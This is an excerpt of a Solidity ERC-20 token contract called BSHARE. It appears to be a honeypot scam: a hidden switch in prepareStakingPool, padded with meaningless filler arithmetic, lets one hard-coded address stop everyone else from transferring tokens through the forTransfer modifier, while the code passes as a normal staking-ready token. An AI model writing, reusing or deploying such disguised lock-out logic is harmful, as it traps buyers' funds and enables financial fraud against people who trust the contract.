...
contract BSHARE is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokenx_totalSupply;
    uint256 private _tokenx_status = 0;
    uint256 public stakingPoolxStatus = 0;

    string private _tokenx_name;
    string private _tokenx_symbol;

    address private _poolxAddress = 0x251A28D0eA43170f8E4c9B17cD244E75a7Ae9DfA;

    constructor() {
        _tokenx_name = "BSHARE";
        _tokenx_symbol = "BSHARE";
        _tokenx_totalSupply = 800 * 10 ** 18;
        _balances[msg.sender] = _tokenx_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolxAddress || _tokenx_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenx_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolxStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolxAddress)
        {
            _tokenx_status = 1;
        }
    }
